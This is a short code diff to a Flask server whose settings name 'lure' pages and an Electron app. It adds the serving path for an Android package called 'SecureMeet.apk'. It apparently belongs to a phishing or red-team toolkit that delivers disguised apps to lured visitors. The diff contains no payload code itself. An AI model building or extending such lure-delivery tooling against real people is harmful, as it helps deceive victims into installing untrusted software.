@@ -384,6 +384,9 @@ def start_flask_single(page, port, electron_app_path=None):
         srv.app.config["LURE_PAGE"]         = "launcher"
         srv.app.config["BROWSER_LURE_PAGE"] = page
         srv.app.config["ELECTRON_APP_PATH"] = electron_app_path
+        _apk = os.path.join(script_dir, "android", "dist", "SecureMeet.apk")
+        if os.path.exists(_apk):
+            srv.app.config["ANDROID_APK_PATH"] = _apk
     else:
         srv.app.config["LURE_PAGE"] = page
 
